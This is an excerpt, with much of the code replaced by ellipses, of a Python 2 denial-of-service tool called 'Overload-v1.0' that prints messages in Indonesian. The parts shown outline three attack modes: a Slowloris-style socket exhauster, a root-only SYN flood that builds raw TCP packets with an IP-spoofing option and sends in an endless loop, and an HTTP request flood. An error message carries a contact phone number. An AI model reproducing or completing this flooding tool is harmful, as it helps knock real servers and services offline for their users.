...
def check_tgt(args):
	...
	try:
		...
		sys.exit(cprint('-> HOST TIDAK DIKENAL !','red'))
	return ip
...
class slow:
	...
	def building_socket(self):
		try:
			...
			sys.exit(cprint('-> ATTACK DIBATALKAN OLEH USER','red'))
		return sock
	...
	def doconnection(self):
		...
		lsocks=[]
		lhandlers=[]
		cprint('\t\tSedang Membuat dan menutupi soket...','red')
...
'''
	...
	if args.syn:
		uid = os.getuid()
		if uid == 0:
			cprint('-> Kamu Di izinkan untuk menjalankan Overload-v1.0','green')
			time.sleep(0.5)
		else:
			sys.exit(cprint('-> Kamu Tidak\'t diizinkan untuk menjalankan script ini harap hub 083845118735','red'))
		tgt=check_tgt(args)
		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		ts=[]
		threads=[]
		print colored('-> SYN Pemuh dimulai pada: ','blue')+colored(tgt,'red')
		while 1:
			if args.spoof == False:
				args.fakeip = True
				if args.fakeip == True:
		...
		tgt = args.target
		threads = []
		print colored('-> Sedang mengirim permintaan ke: ','blue')+colored(tgt,'red')
		while 1:
			try:
	...
	if not (args.syn) and not (args.request) and not (args.slow):
		parser.print_help()
		print
		cprint('-> Kamu harus menentukan argumen Yang Akan diserangan.','red')
